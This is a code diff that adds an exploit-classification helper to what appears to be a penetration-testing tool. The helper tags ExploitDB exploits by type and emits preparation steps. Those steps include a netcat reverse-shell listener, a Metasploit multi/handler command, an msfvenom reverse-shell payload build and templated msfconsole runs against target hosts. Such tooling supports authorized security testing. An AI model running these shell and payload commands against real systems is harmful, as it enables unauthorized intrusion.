@@ -4202,6 +4202,168 @@ def _interpreter_for(source: str) -> str:
     return "python3"
 
 
+def _classify_exploit(title: str, description: str = "", msf_module: str = "") -> dict:
+    """Analyse exploit title/description and return type, requirements, and preparation steps.
+
+    Returns a dict with:
+      ``exploit_type``   – human-readable category string
+      ``requirements``   – list of requirement dicts, each with ``icon``, ``label``, and ``detail``
+      ``preparation``    – list of plain-text preparation step strings
+    """
+    combined = " ".join([title, description, msf_module]).lower()
+
+    exploit_type = "Unknown"
+    requirements = []
+    preparation = []
+
+    # ------------------------------------------------------------------ #
+    # 1. Classify the primary exploit category                            #
+    # ------------------------------------------------------------------ #
+    if any(x in combined for x in [
+        "reverse shell", "reverse_tcp", "reverse_https", "reverse_http",
+        "shell/reverse", "meterpreter", "stageless",
+    ]):
+        exploit_type = "Remote Code Execution — Reverse Shell"
+        requirements.append({
+            "icon": "🎧",
+            "label": "Netcat / Metasploit listener required",
+            "detail": "Start a listener on your machine before running the exploit.",
+        })
+        preparation.append("nc -lvnp 4444")
+        preparation.append("# OR via Metasploit:")
+        preparation.append("msfconsole -x \"use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST <your-ip>; set LPORT 4444; run\"")
+
+    elif any(x in combined for x in ["bind shell", "bind_tcp"]):
+        exploit_type = "Remote Code Execution — Bind Shell"
+        requirements.append({
+            "icon": "🔌",
+            "label": "Connect to target after exploit",
+            "detail": "The exploit opens a listening shell on the target; connect after execution.",
+        })
+        preparation.append("# After exploit runs, connect with:")
+        preparation.append("nc <target-ip> <bind-port>")
+
+    elif any(x in combined for x in [
+        "remote code execution", "rce", "command execution", "code exec",
+        "arbitrary command", "os command", "command injection",
+    ]):
+        exploit_type = "Remote Code Execution"
+        requirements.append({
+            "icon": "💻",
+            "label": "Remote command execution on target",
+            "detail": "The exploit will execute arbitrary commands on the target host.",
+        })
+
+    elif any(x in combined for x in [
+        "privilege escalation", "privesc", "local privilege", "lpe",
+    ]):
+        exploit_type = "Privilege Escalation"
+        requirements.append({
+            "icon": "🔓",
+            "label": "Existing local access required",
+            "detail": "You must already have a low-privileged shell on the target before running this exploit.",
+        })
+
+    elif any(x in combined for x in [
+        "local file inclusion", "directory traversal", "path traversal",
+        "lfi", "file disclosure", "file read", "arbitrary file read",
+        "information disclosure",
+    ]):
+        exploit_type = "File Read / Information Disclosure"
+        requirements.append({
+            "icon": "📂",
+            "label": "Reads files from target filesystem",
+            "detail": "Results will contain file contents (e.g. /etc/passwd, config files).",
+        })
+
+    elif any(x in combined for x in [
+        "sql injection", "sqli", "blind sql",
+    ]):
+        exploit_type = "SQL Injection"
+        requirements.append({
+            "icon": "🗃️",
+            "label": "Extracts database contents",
+            "detail": "The exploit will dump database records from the target.",
+        })
+
+    elif any(x in combined for x in [
+        "denial of service", " dos ", "crash", "reboot", "memory corruption",
+    ]):
+        exploit_type = "Denial of Service"
+        requirements.append({
+            "icon": "💥",
+            "label": "Crashes or disrupts the target",
+            "detail": "Running this exploit may cause the target service to crash or become unavailable.",
+        })
+
+    elif any(x in combined for x in [
+        "buffer overflow", "heap overflow", "stack overflow", "integer overflow",
+        "use after free", "heap spray",
+    ]):
+        exploit_type = "Memory Corruption"
+        requirements.append({
+            "icon": "🧠",
+            "label": "Memory corruption exploit",
+            "detail": "May result in RCE or crash depending on target conditions.",
+        })
+
+    else:
+        requirements.append({
+            "icon": "⚠️",
+            "label": "Review exploit code before running",
+            "detail": "Exploit type could not be determined automatically.",
+        })
+
+    # ------------------------------------------------------------------ #
+    # 2. Secondary requirement flags (can stack onto any primary type)    #
+    # ------------------------------------------------------------------ #
+    if any(x in combined for x in [
+        "file upload", "arbitrary file upload", "unrestricted upload",
+    ]):
+        requirements.append({
+            "icon": "📤",
+            "label": "File upload to target required",
+            "detail": "The exploit will upload a payload file to the target.",
+        })
+        preparation.append("# Prepare a payload file (e.g. via msfvenom):")
+        preparation.append("msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f elf -o payload.elf")
+
+    if any(x in combined for x in [
+        "credential", "password", "username", "default credentials",
+        "authentication bypass", "auth bypass", "backdoor",
+    ]):
+        requirements.append({
+            "icon": "🔑",
+            "label": "Credential / authentication related",
+            "detail": "The exploit may expose, bypass, or reset credentials on the target.",
+        })
+
+    if any(x in combined for x in [
+        "wget", "curl", "download", "fetch", "http request",
+    ]):
+        requirements.append({
+            "icon": "📥",
+            "label": "Target fetches a remote resource",
+            "detail": "Ensure the attacker host is reachable from the target network.",
+        })
+
+    if msf_module:
+        requirements.append({
+            "icon": "🔫",
+            "label": "Metasploit module available",
+            "detail": "use {}".format(msf_module),
+        })
+        if "use {}".format(msf_module) not in preparation:
+            preparation.append("# Run via Metasploit:")
+            preparation.append("msfconsole -x \"use {}; set RHOSTS <target-ip>; run\"".format(msf_module))
+
+    return {
+        "exploit_type": exploit_type,
+        "requirements": requirements,
+        "preparation": preparation,
+    }
+
+
 def _download_exploitdb(edb_id: str) -> str | None:
     """Download raw exploit source from ExploitDB.  Returns content or None on error."""
     # Only numeric IDs are valid
